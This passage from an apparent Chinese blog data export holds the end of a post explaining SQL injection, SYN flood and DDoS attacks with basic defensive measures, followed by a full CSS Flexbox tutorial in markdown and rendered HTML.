表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p>\n<h3 id=\"SQL-防护\"><a href=\"#SQL-防护\" class=\"headerlink\" title=\"SQL 防护\"></a>SQL 防护</h3><ol>\n<li><p>永远不要信任用户的输入:<br>对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和<br>双”-“进行转换等。</p>\n</li>\n<li><p>永远不要使用动态拼装 sql，可以使用参数化的 sql 或者直接使用存储过程进行数据查询存取。</p>\n</li>\n<li><p>永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。</p>\n</li>\n<li><p>不要把机密信息直接存放，加密或者 hash 掉密码和敏感的信息。</p>\n</li>\n</ol>\n<h2 id=\"SYN-攻击\"><a href=\"#SYN-攻击\" class=\"headerlink\" title=\"SYN 攻击\"></a>SYN 攻击</h2><h3 id=\"概念-1\"><a href=\"#概念-1\" class=\"headerlink\" title=\"概念\"></a>概念</h3><p>在三次握手过程中，服务器发送 SYN-ACK 之后，收到客户端的 ACK 之前的 TCP 连接称为半连接(half-open connect)。此时服务器处于 SYN_RCVD 状态。当收到 ACK 后，服务器才能转入 ESTABLISHED 状态.</p>\n<p>SYN 攻击指的是，攻击客户端在短时间内伪造大量不存在的 IP 地址，向服务器不断地发送 SYN 包，服务器回复确认包，并等待客户的确认。</p>\n<p>由于源地址是不存在的，服务器需要不断的重发直至超时，这些伪造的 SYN 包将长时间占用未连接队列，正常的 SYN 请求被丢弃，导致目标系统运行缓慢，严重者会引起网络堵塞甚至系统瘫痪。</p>\n<h3 id=\"检测-SYN-攻击\"><a href=\"#检测-SYN-攻击\" class=\"headerlink\" title=\"检测 SYN 攻击\"></a>检测 SYN 攻击</h3><p>检测 SYN 攻击非常的方便，当你在服务器上看到大量的半连接状态时，特别是源 IP 地址是随机的，基本上可以断定这是一次 SYN 攻击。</p>\n<h3 id=\"SYN-攻击防护\"><a href=\"#SYN-攻击防护\" class=\"headerlink\" title=\"SYN 攻击防护\"></a>SYN 攻击防护</h3><ol>\n<li>缩短超时（SYN Timeout）时间</li>\n<li>增加最大半连接数</li>\n<li>过滤网关防护</li>\n</ol>\n<h2 id=\"DDOS攻击\"><a href=\"#DDOS攻击\" class=\"headerlink\" title=\"DDOS攻击\"></a>DDOS攻击</h2><h3 id=\"概念-2\"><a href=\"#概念-2\" class=\"headerlink\" title=\"概念\"></a>概念</h3><p>分布式拒绝服务( DDoS:Distributed Denial of Service )攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。</p>\n<p>可以打个比方：</p>\n<p>一群恶霸试图让对面那家有着竞争关系的商铺无法正常营业，他们会采取什么手段呢？（只为举例，切勿模仿）</p>\n<p>恶霸们扮作普通客户一直拥挤在对手的商铺，赖着不走，真正的购物者却无法进入；或者总是和营业员有一搭没一搭的东扯西扯，让工作人员不能正常服务客户；也可以为商铺的经营者提供虚假信息，商铺的上上下下忙成一团之后却发现都是一场空，最终跑了真正的大客户，损失惨重。</p>\n<p>此外恶霸们完成这些坏事有时凭单干难以完成，需要叫上很多人一起。嗯，网络安全领域中 DoS 和 DDoS 攻击就遵循着这些思路。</p>\n<p><strong>DDOS 攻击利用目标系统网络服务功能缺陷或者直接消耗其系统资源，使得该目标系统无法提供正常的服务。</strong></p>\n<p>DDoS 攻击通过大量合法的请求占用大量网络资源，以达到瘫痪网络的目的。 具体有几种形式：</p>\n<ol>\n<li>通过使网络过载来干扰甚至阻断正常的网络通讯；</li>\n<li>通过向服务器提交大量请求，使服务器超负荷；</li>\n<li>阻断某一用户访问服务器；</li>\n<li>阻断某服务与特定系统或个人的通讯。</li>\n</ol>\n<p>IP Spoofing:<br>IP欺骗攻击是一种黑客通过向服务端发送虚假的包以欺骗服务器的DDOS攻击示意图DDOS攻击示意图做法。</p>\n<p>具体说，就是将包中的源 IP 地址设置为不存在或不合法的值。服务器一旦接受到该包便会返回接受请求包，但实际上这个包永远返回不到来源处的计算机。这种做法使服务器必需开启自己的监听端口不断等待，也就浪费了系统各方面的资源。 </p>\n<h3 id=\"DDOS-防御\"><a href=\"#DDOS-防御\" class=\"headerlink\" title=\"DDOS 防御\"></a>DDOS 防御</h3><ol>\n<li>关闭不必要的服务</li>\n<li>限制同时打开的 Syn 半连接数目</li>\n<li>缩短Syn半连接的time out 时间</li>\n</ol>\n<p>参考链接：</p>\n<ul>\n<li><a href=\"http://hit-alibaba.github.io/interview/basic/network/TCP.html\">TCP 协议 笔试面试知识整理</a></li>\n<li><a href=\"http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html\">浅谈CSRF攻击方式 - hyddd - 博客园</a></li>\n<li><a href=\"http://baike.baidu.com/link?url=REctw71a-zdfpceJUYOVJRdapLLC7zz321lNEjpl_EMD4LW5D7X4_9vXYfUj_qqbWhfPj-CI0zWC4nlkbQZCIrG8GFYSbPJjSA1-NxwKBL8DUr2m5HU86iLB4AbEdhNJsWl7HqFt85b4pTDCQXPjzK\">分布式拒绝服务攻击 百度百科</a></li>\n<li><a href=\"http://baike.baidu.com/view/3896.htm\">sql注入 百度百科</a></li>\n</ul>\n"},{"layout":"post","title":"CSS - Flex 布局学习笔记","date":"2016-03-12T04:00:00.000Z","author":"Lindz","header-img":"img/12.jpg","_content":"\n## 一、Flexbox 是什么呢？\n\n谈到页面布局，相信很多人都依赖于 display + position + float 属性来实现，但是这些都不够语义化，而且代码写起来不够简洁优雅。\n\nFlexbox 是 flexible box 的缩写，为“ 弹性布局 ”，**它可以更加有语义化地实现各种页面布局，给盒模型之间提供很大的灵活性**\n\nFlexbox 一种设计来实现更复杂的页面版面布局，它本质上就是个**盒模型**的延伸，Flexbox 进一步去规范了这些盒模型之间彼此的相对关系。\n\nFlex 布局将成为未来布局的首选方案，关于兼容性：\n\n![](/assets/2016-03-13-learn-css-flexbox/1.jpg)\n\n如果不考虑 IE 低版本浏览器，那就放心地使用 flexbox 来进行布局吧！\n\n## 二、Flex 基本概念\n\n下面简单介绍一下 flex 中一些常用术语\n\n![](/assets/2016-03-13-learn-css-flexbox/2.jpg)\n\n容器默认存在两条轴，水平主轴 (main axis) 和垂直的交叉轴 (cross axis) ；主轴的开始位置 (main start)，交叉轴的开始位置 (cross start)；\n\n每个项目占据的主轴空间为 (main size), 占据的交叉轴的空间为 (cross size);\n\n## 三、Flex 容器\n\n首先，实现 flex 布局需要指定一个容器，任何一个容器都可以指定为 flex 布局，这样容器内的元素就可以实现 flex 布局。\n\n```css\n.container{\n\tdisplay: flex | inline-flex;   //可以有两种取值\n}\n```\n\n分别生成一个 block-level 或者 inline-level 的 flex 容器盒子。\n\nwebkit 内核的浏览器需要加上 -webkit- 前缀\n\n```css\n.container{\n\tdisplay: -webkit-flex; \n}\n```\n\n**注意：设为 flex 布局后，子元素的 float、 clear、 vertical-align 属性将会失效**\n\n## 四、Flex 容器属性\n\n有六种属性可以设在容器 container 中\n\n* flex-direction\n* flex-wrap\n* flex-flow\n* justify-content\n* align-items\n* align-content\n\n### flex-direction: 决定主轴的方向(即项目的排列方向)\n\n```css\n.container{\n\tflex-direction: row | row-reverse | column | column-reverse; \n}\n```\n\n默认值: row，主轴为水平方向，起点在左端    \n\n![](/assets/2016-03-13-learn-css-flexbox/1.png)\n\nrow-reverse：主轴为水平方向，起点在右端  \n\n![](/assets/2016-03-13-learn-css-flexbox/2.png)\n\ncolumn：主轴为垂直方向，起点在上沿  \n\n![](/assets/2016-03-13-learn-css-flexbox/3.png)\n\ncolumn-reverse：主轴为垂直方向，起点在下沿\n\n![](/assets/2016-03-13-learn-css-flexbox/4.png)\n\n### flex-wrap: 决定容器内项目是否可换行\n\n默认情况下，项目都排在主轴线上，使用 flex-wrap 可实现项目换行\n\n```css\n.container{\n\tflex-wrap: nowrap | wrap | wrap-reverse;\n}\n```\n\n默认值：nowrap 不换行\n\n![](/assets/2016-03-13-learn-css-flexbox/5.png)\n\nwrap: 项目宽度综合超出容器时换行，第一行在上方\n\n![](/assets/2016-03-13-learn-css-flexbox/6.png)\n\nwrap-reverse：换行，第一行在下方\n\n![](/assets/2016-03-13-learn-css-flexbox/7.png)\n\n###  flex-flow: flex-direction 和 flex-wrap 的简写形式\n\n默认值为: row nowrap\n\n```css\n.container{\n\tflex-flow: <flex-direction> || <flex-wrap>;\n}\n```\n\n### justify-content：定义了项目在主轴的对齐方式。\n\n```css\n.container{\n\tjustify-content: flex-start | flex-end | center | space-between | space-around;\n}\n```\n\n默认值: flex-start 左对齐\n\n![](/assets/2016-03-13-learn-css-flexbox/8.png)\n\nflex-end：右对齐\n\n![](/assets/2016-03-13-learn-css-flexbox/9.png)\n\ncenter： 居中\n\n![](/assets/2016-03-13-learn-css-flexbox/10.png)\n\nspace-between：两端对齐，项目之间的间隔都相等。\n\n![](/assets/2016-03-13-learn-css-flexbox/11.png)\n\nspace-around：每个项目两侧的间隔相等。所以，项目之间的间隔比项目与边框的间隔大一倍。\n\n![](/assets/2016-03-13-learn-css-flexbox/12.png)\n\n###  align-items：定义了项目在交叉轴上的对齐方式 \n\n```css\n.container{\n\talign-items: flex-start | flex-end | center | baseline | strech;\n}\n```\n\n默认值: stretch 如果项目未设置高度或设为 auto，将占满整个容器的高度 \n\n![](/assets/2016-03-13-learn-css-flexbox/13.png)\n\nflex-start：交叉轴的起点对齐\n\n![](/assets/2016-03-13-learn-css-flexbox/14.png)\n\nflex-end：交叉轴的终点对齐\n\n![](/assets/2016-03-13-learn-css-flexbox/15.png)\n\ncenter：交叉轴的中点对齐\n\n![](/assets/2016-03-13-learn-css-flexbox/16.png)\n\nbaseline: 项目的第一行文字的基线对齐\n\n![](/assets/2016-03-13-learn-css-flexbox/17.png)\n\n### align-conten: 定义了多根轴线的对齐方式，如果项目只有一根轴线，那么该属性将不起作用\n\n```css\n.container{\n\talign-content: flex-start | flex-end | center | space-between | space-around | stretch;\n}\n```\n\n## 五、Flex 项目属性\n\n有六种属性可运用在项目上\n\n* order\n* flex-basis\n* flex-grow\n* flex-shrink\n* flex \n* align-self\n\n### order：定义项目的排列顺序。数值越小，排列越靠前，默认为0。\n\n```css\n.item{\n\torder: <integer>;\n}\n```\n\n![](/assets/2016-03-13-learn-css-flexbox/18.png)\n\n### flex-basis: 定义了在分配多余空间之前，项目占据的主轴空间，浏览器根据这个属性，计算主轴是否有多余空间\n\n```css\n.item{\n\tflex-basis: <length> | auto;\n}\n```\n\n默认值：auto，即项目本来的大小, 这时候 item 的宽高取决于 width 或 height 的值\n\n**flex-basis 需要跟 flex-grow 和 flex-shrink 配合使用才能发挥效果**\n\n### flex-grow: 定义项目的放大比例\n\n```css\n.item{\n\tflex-grow: <number>;\n}\n```\n\n默认值: 0，即如果存在剩余空间，也不放大\n\n![](/assets/2016-03-13-learn-css-flexbox/19.png)\n\n如果所有项目的 flex-grow 属性都为 1，则它们将等分剩余空间。(如果有的话)  \n如果一个项目的 flex-grow 属性为 2，其他项目都为 1，则前者占据的剩余空间将比其他项多一倍。\n\n### flex-shrink: 定义了项目的缩小比例\n\n```css\n.item{\n\tflex-shrink: <number>;\n}\n```\n\n默认值：1，即如果空间不足，该项目将缩小\n\n**负值对该属性无效**\n\n![](/assets/2016-03-13-learn-css-flexbox/20.png)\n\n同理可得：\n\n如果所有项目的 flex-shrink 属性都为 1，当空间不足时，都将等比例缩小。    \n如果一个项目的 flex-shrink 属性为 0，其他项目都为 1，则空间不足时，前者不缩小。\n\n### flex: flex-grow, flex-shrink 和 flex-basis的简写\n\n```css\n.item{\n\tflex: none | [ <'flex-grow'> <'flex-shrink'>? || <'flex-basis'> ]\n}\n```\n\n默认值：0 1 auto， 即不放大，可缩小，大小与 width、height 有关 \n\n快捷值：auto (1 1 auto) 和 none (0 0 auto)\n\n建议优先使用这个属性，而不是单独写三个分离的属性。\n\nflex-grow 和 flex-shrink 可缺省，故可单单设置: flex: 2;\n\ngrow 和 shrink 是一对双胞胎，grow 表示伸张因子，shrink 表示是收缩因子。\n\ngrow 在 flex 容器下的子元素的宽度和比容器和小的时候起作用。 grow 定义了子元素的宽度增长因子，容器中除去子元素之和剩下的宽度会按照各个子元素的 grow 值进行平分加大各个子元素上。\n\n#### 公式：\n\n计算容器还剩空间\n\n```code\navailable_space (容器还剩的空间）= container_size (容器宽度) - flex_item_total (子元素宽度之和)\n```\n\n计算增长单位\n\n```code\ngrow_unit (增长单位) = available_space / flex_grow_total(子元素增长因子之和)\n``` \n\n得到子元素的宽度\n\n```code\nflex-item-width (子元素计算得到的宽度) = flex-basis + grow-unit * flex-grow   \n```\n\n### align-self: 允许单个项目有与其他项目不一样的对齐方式\n\n单个项目覆盖 align-items 定义的属性  \n默认值为auto，表示继承父元素的align-items属性，如果没有父元素，则等同于stretch。\n\n```css\n.item {\n\talign-self: auto | flex-start | flex-end | center | baseline | stretch;\n}\n```\n\n该属性可能取6个值，除了auto，其他都与align-items属性完全一致。\n\n<hr>\n\n讲到这里，flex 布局的基本语法就记录完毕。\n\n参考链接：\n\n* [Flex 布局教程：语法篇 - 阮一峰的网络日志](http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html?utm_source=tuicool)\n* [flexbox：更加优雅的Web布局](https://segmentfault.com/a/1190000002616717#articleHeader11)\n* [CSS3 Flexbox](http://www.html-js.com/article/2582)\n","source":"_posts/2016-03-12-learn-css-flexbox.md","raw":"---\nlayout:     post\ntitle:      \"CSS - Flex 布局学习笔记\"\ndate:       2016-03-12 12:00:00\nauthor:     \"Lindz\"\nheader-img: \"img/12.jpg\"\ntags:\n    - CSS\n---\n\n## 一、Flexbox 是什么呢？\n\n谈到页面布局，相信很多人都依赖于 display + position + float 属性来实现，但是这些都不够语义化，而且代码写起来不够简洁优雅。\n\nFlexbox 是 flexible box 的缩写，为“ 弹性布局 ”，**它可以更加有语义化地实现各种页面布局，给盒模型之间提供很大的灵活性**\n\nFlexbox 一种设计来实现更复杂的页面版面布局，它本质上就是个**盒模型**的延伸，Flexbox 进一步去规范了这些盒模型之间彼此的相对关系。\n\nFlex 布局将成为未来布局的首选方案，关于兼容性：\n\n![](/assets/2016-03-13-learn-css-flexbox/1.jpg)\n\n如果不考虑 IE 低版本浏览器，那就放心地使用 flexbox 来进行布局吧！\n\n## 二、Flex 基本概念\n\n下面简单介绍一下 flex 中一些常用术语\n\n![](/assets/2016-03-13-learn-css-flexbox/2.jpg)\n\n容器默认存在两条轴，水平主轴 (main axis) 和垂直的交叉轴 (cross axis) ；主轴的开始位置 (main start)，交叉轴的开始位置 (cross start)；\n\n每个项目占据的主轴空间为 (main size), 占据的交叉轴的空间为 (cross size);\n\n## 三、Flex 容器\n\n首先，实现 flex 布局需要指定一个容器，任何一个容器都可以指定为 flex 布局，这样容器内的元素就可以实现 flex 布局。\n\n```css\n.container{\n\tdisplay: flex | inline-flex;   //可以有两种取值\n}\n```\n\n分别生成一个 block-level 或者 inline-level 的 flex 容器盒子。\n\nwebkit 内核的浏览器需要加上 -webkit- 前缀\n\n```css\n.container{\n\tdisplay: -webkit-flex; \n}\n```\n\n**注意：设为 flex 布局后，子元素的 float、 clear、 vertical-align 属性将会失效**\n\n## 四、Flex 容器属性\n\n有六种属性可以设在容器 container 中\n\n* flex-direction\n* flex-wrap\n* flex-flow\n* justify-content\n* align-items\n* align-content\n\n### flex-direction: 决定主轴的方向(即项目的排列方向)\n\n```css\n.container{\n\tflex-direction: row | row-reverse | column | column-reverse; \n}\n```\n\n默认值: row，主轴为水平方向，起点在左端    \n\n![](/assets/2016-03-13-learn-css-flexbox/1.png)\n\nrow-reverse：主轴为水平方向，起点在右端  \n\n![](/assets/2016-03-13-learn-css-flexbox/2.png)\n\ncolumn：主轴为垂直方向，起点在上沿  \n\n![](/assets/2016-03-13-learn-css-flexbox/3.png)\n\ncolumn-reverse：主轴为垂直方向，起点在下沿\n\n![](/assets/2016-03-13-learn-css-flexbox/4.png)\n\n### flex-wrap: 决定容器内项目是否可换行\n\n默认情况下，项目都排在主轴线上，使用 flex-wrap 可实现项目换行\n\n```css\n.container{\n\tflex-wrap: nowrap | wrap | wrap-reverse;\n}\n```\n\n默认值：nowrap 不换行\n\n![](/assets/2016-03-13-learn-css-flexbox/5.png)\n\nwrap: 项目宽度综合超出容器时换行，第一行在上方\n\n![](/assets/2016-03-13-learn-css-flexbox/6.png)\n\nwrap-reverse：换行，第一行在下方\n\n![](/assets/2016-03-13-learn-css-flexbox/7.png)\n\n###  flex-flow: flex-direction 和 flex-wrap 的简写形式\n\n默认值为: row nowrap\n\n```css\n.container{\n\tflex-flow: <flex-direction> || <flex-wrap>;\n}\n```\n\n### justify-content：定义了项目在主轴的对齐方式。\n\n```css\n.container{\n\tjustify-content: flex-start | flex-end | center | space-between | space-around;\n}\n```\n\n默认值: flex-start 左对齐\n\n![](/assets/2016-03-13-learn-css-flexbox/8.png)\n\nflex-end：右对齐\n\n![](/assets/2016-03-13-learn-css-flexbox/9.png)\n\ncenter： 居中\n\n![](/assets/2016-03-13-learn-css-flexbox/10.png)\n\nspace-between：两端对齐，项目之间的间隔都相等。\n\n![](/assets/2016-03-13-learn-css-flexbox/11.png)\n\nspace-around：每个项目两侧的间隔相等。所以，项目之间的间隔比项目与边框的间隔大一倍。\n\n![](/assets/2016-03-13-learn-css-flexbox/12.png)\n\n###  align-items：定义了项目在交叉轴上的对齐方式 \n\n```css\n.container{\n\talign-items: flex-start | flex-end | center | baseline | strech;\n}\n```\n\n默认值: stretch 如果项目未设置高度或设为 auto，将占满整个容器的高度 \n\n![](/assets/2016-03-13-learn-css-flexbox/13.png)\n\nflex-start：交叉轴的起点对齐\n\n![](/assets/2016-03-13-learn-css-flexbox/14.png)\n\nflex-end：交叉轴的终点对齐\n\n![](/assets/2016-03-13-learn-css-flexbox/15.png)\n\ncenter：交叉轴的中点对齐\n\n![](/assets/2016-03-13-learn-css-flexbox/16.png)\n\nbaseline: 项目的第一行文字的基线对齐\n\n![](/assets/2016-03-13-learn-css-flexbox/17.png)\n\n### align-conten: 定义了多根轴线的对齐方式，如果项目只有一根轴线，那么该属性将不起作用\n\n```css\n.container{\n\talign-content: flex-start | flex-end | center | space-between | space-around | stretch;\n}\n```\n\n## 五、Flex 项目属性\n\n有六种属性可运用在项目上\n\n* order\n* flex-basis\n* flex-grow\n* flex-shrink\n* flex \n* align-self\n\n### order：定义项目的排列顺序。数值越小，排列越靠前，默认为0。\n\n```css\n.item{\n\torder: <integer>;\n}\n```\n\n![](/assets/2016-03-13-learn-css-flexbox/18.png)\n\n### flex-basis: 定义了在分配多余空间之前，项目占据的主轴空间，浏览器根据这个属性，计算主轴是否有多余空间\n\n```css\n.item{\n\tflex-basis: <length> | auto;\n}\n```\n\n默认值：auto，即项目本来的大小, 这时候 item 的宽高取决于 width 或 height 的值\n\n**flex-basis 需要跟 flex-grow 和 flex-shrink 配合使用才能发挥效果**\n\n### flex-grow: 定义项目的放大比例\n\n```css\n.item{\n\tflex-grow: <number>;\n}\n```\n\n默认值: 0，即如果存在剩余空间，也不放大\n\n![](/assets/2016-03-13-learn-css-flexbox/19.png)\n\n如果所有项目的 flex-grow 属性都为 1，则它们将等分剩余空间。(如果有的话)  \n如果一个项目的 flex-grow 属性为 2，其他项目都为 1，则前者占据的剩余空间将比其他项多一倍。\n\n### flex-shrink: 定义了项目的缩小比例\n\n```css\n.item{\n\tflex-shrink: <number>;\n}\n```\n\n默认值：1，即如果空间不足，该项目将缩小\n\n**负值对该属性无效**\n\n![](/assets/2016-03-13-learn-css-flexbox/20.png)\n\n同理可得：\n\n如果所有项目的 flex-shrink 属性都为 1，当空间不足时，都将等比例缩小。    \n如果一个项目的 flex-shrink 属性为 0，其他项目都为 1，则空间不足时，前者不缩小。\n\n### flex: flex-grow, flex-shrink 和 flex-basis的简写\n\n```css\n.item{\n\tflex: none | [ <'flex-grow'> <'flex-shrink'>? || <'flex-basis'> ]\n}\n```\n\n默认值：0 1 auto， 即不放大，可缩小，大小与 width、height 有关 \n\n快捷值：auto (1 1 auto) 和 none (0 0 auto)\n\n建议优先使用这个属性，而不是单独写三个分离的属性。\n\nflex-grow 和 flex-shrink 可缺省，故可单单设置: flex: 2;\n\ngrow 和 shrink 是一对双胞胎，grow 表示伸张因子，shrink 表示是收缩因子。\n\ngrow 在 flex 容器下的子元素的宽度和比容器和小的时候起作用。 grow 定义了子元素的宽度增长因子，容器中除去子元素之和剩下的宽度会按照各个子元素的 grow 值进行平分加大各个子元素上。\n\n#### 公式：\n\n计算容器还剩空间\n\n```code\navailable_space (容器还剩的空间）= container_size (容器宽度) - flex_item_total (子元素宽度之和)\n```\n\n计算增长单位\n\n```code\ngrow_unit (增长单位) = available_space / flex_grow_total(子元素增长因子之和)\n``` \n\n得到子元素的宽度\n\n```code\nflex-item-width (子元素计算得到的宽度) = flex-basis + grow-unit * flex-grow   \n```\n\n### align-self: 允许单个项目有与其他项目不一样的对齐方式\n\n单个项目覆盖 align-items 定义的属性  \n默认值为auto，表示继承父元素的align-items属性，如果没有父元素，则等同于stretch。\n\n```css\n.item {\n\talign-self: auto | flex-start | flex-end | center | baseline | stretch;\n}\n```\n\n该属性可能取6个值，除了auto，其他都与align-items属性完全一致。\n\n<hr>\n\n讲到这里，flex 布局的基本语法就记录完毕。\n\n参考链接：\n\n* [Flex 布局教程：语法篇 - 阮一峰的网络日志](http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html?utm_source=tuicool)\n* [flexbox：更加优雅的Web布局](https://segmentfault.com/a/1190000002616717#articleHeader11)\n* [CSS3 Flexbox](http://www.html-js.com/article/2582)\n","slug":"2016-03-12-learn-css-flexbox","published":1,"updated":"2016-03-14T13:44:30.000Z","comments":1,"photos":[],"link":"","_id":"cim4u6rxs000kxmvd8kcz49d3","content":"<h2 id=\"一、Flexbox-是什么呢？\"><a href=\"#一、Flexbox-是什么呢？\" class=\"headerlink\" title=\"一、Flexbox 是什么呢？\"></a>一、Flexbox 是什么呢？</h2><p>谈到页面布局，相信很多人都依赖于 display + position + float 属性来实现，但是这些都不够语义化，而且代码写起来不够简洁优雅。</p>\n<p>Flexbox 是 flexible box 的缩写，为“ 弹性布局 ”，<strong>它可以更加有语义化地实现各种页面布局，给盒模型之间提供很大的灵活性</strong></p>\n<p>Flexbox 一种设计来实现更复杂的页面版面布局，它本质上就是个<strong>盒模型</strong>的延伸，Flexbox 进一步去规范了这些盒模型之间彼此的相对关系。</p>\n<p>Flex 布局将成为未来布局的首选方案，关于兼容性：</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/1.jpg\" alt=\"\"></p>\n<p>如果不考虑 IE 低版本浏览器，那就放心地使用 flexbox 来进行布局吧！</p>\n<h2 id=\"二、Flex-基本概念\"><a href=\"#二、Flex-基本概念\" class=\"headerlink\" title=\"二、Flex 基本概念\"></a>二、Flex 基本概念</h2><p>下面简单介绍一下 flex 中一些常用术语</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/2.jpg\" alt=\"\"></p>\n<p>容器默认存在两条轴，水平主轴 (main axis) 和垂直的交叉轴 (cross axis) ；主轴的开始位置 (main start)，交叉轴的开始位置 (cross start)；</p>\n<p>每个项目占据的主轴空间为 (main size), 占据的交叉轴的空间为 (cross size);</p>\n<h2 id=\"三、Flex-容器\"><a href=\"#三、Flex-容器\" class=\"headerlink\" title=\"三、Flex 容器\"></a>三、Flex 容器</h2><p>首先，实现 flex 布局需要指定一个容器，任何一个容器都可以指定为 flex 布局，这样容器内的元素就可以实现 flex 布局。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.container&#123;</span><br><span class=\"line\">\tdisplay: flex | inline-flex;   //可以有两种取值</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>分别生成一个 block-level 或者 inline-level 的 flex 容器盒子。</p>\n<p>webkit 内核的浏览器需要加上 -webkit- 前缀</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.container</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">display</span>: -webkit-flex; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>注意：设为 flex 布局后，子元素的 float、 clear、 vertical-align 属性将会失效</strong></p>\n<h2 id=\"四、Flex-容器属性\"><a href=\"#四、Flex-容器属性\" class=\"headerlink\" title=\"四、Flex 容器属性\"></a>四、Flex 容器属性</h2><p>有六种属性可以设在容器 container 中</p>\n<ul>\n<li>flex-direction</li>\n<li>flex-wrap</li>\n<li>flex-flow</li>\n<li>justify-content</li>\n<li>align-items</li>\n<li>align-content</li>\n</ul>\n<h3 id=\"flex-direction-决定主轴的方向-即项目的排列方向\"><a href=\"#flex-direction-决定主轴的方向-即项目的排列方向\" class=\"headerlink\" title=\"flex-direction: 决定主轴的方向(即项目的排列方向)\"></a>flex-direction: 决定主轴的方向(即项目的排列方向)</h3><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.container</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">flex-direction</span>: row | row-reverse | column | column-reverse; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>默认值: row，主轴为水平方向，起点在左端    </p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/1.png\" alt=\"\"></p>\n<p>row-reverse：主轴为水平方向，起点在右端  </p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/2.png\" alt=\"\"></p>\n<p>column：主轴为垂直方向，起点在上沿  </p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/3.png\" alt=\"\"></p>\n<p>column-reverse：主轴为垂直方向，起点在下沿</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/4.png\" alt=\"\"></p>\n<h3 id=\"flex-wrap-决定容器内项目是否可换行\"><a href=\"#flex-wrap-决定容器内项目是否可换行\" class=\"headerlink\" title=\"flex-wrap: 决定容器内项目是否可换行\"></a>flex-wrap: 决定容器内项目是否可换行</h3><p>默认情况下，项目都排在主轴线上，使用 flex-wrap 可实现项目换行</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.container</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">flex-wrap</span>: nowrap | wrap | wrap-reverse;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>默认值：nowrap 不换行</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/5.png\" alt=\"\"></p>\n<p>wrap: 项目宽度综合超出容器时换行，第一行在上方</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/6.png\" alt=\"\"></p>\n<p>wrap-reverse：换行，第一行在下方</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/7.png\" alt=\"\"></p>\n<h3 id=\"flex-flow-flex-direction-和-flex-wrap-的简写形式\"><a href=\"#flex-flow-flex-direction-和-flex-wrap-的简写形式\" class=\"headerlink\" title=\"flex-flow: flex-direction 和 flex-wrap 的简写形式\"></a>flex-flow: flex-direction 和 flex-wrap 的简写形式</h3><p>默认值为: row nowrap</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.container</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">flex-flow</span>: &lt;flex-direction&gt; || &lt;flex-wrap&gt;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"justify-content：定义了项目在主轴的对齐方式。\"><a href=\"#justify-content：定义了项目在主轴的对齐方式。\" class=\"headerlink\" title=\"justify-content：定义了项目在主轴的对齐方式。\"></a>justify-content：定义了项目在主轴的对齐方式。</h3><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.container</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">justify-content</span>: flex-start | flex-end | center | space-between | space-around;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>默认值: flex-start 左对齐</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/8.png\" alt=\"\"></p>\n<p>flex-end：右对齐</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/9.png\" alt=\"\"></p>\n<p>center： 居中</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/10.png\" alt=\"\"></p>\n<p>space-between：两端对齐，项目之间的间隔都相等。</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/11.png\" alt=\"\"></p>\n<p>space-around：每个项目两侧的间隔相等。所以，项目之间的间隔比项目与边框的间隔大一倍。</p>\n<p><img src=\"/assets/2016-03-13-learn-css-flexbox/12.png\" alt=\"\"></p>\n<h3 id=\"align-items：定义了项目在交叉轴上的对齐方式\"><a href=\"#align-items：定义了项目在交叉轴上的对齐方式\" class=\"headerlink\" 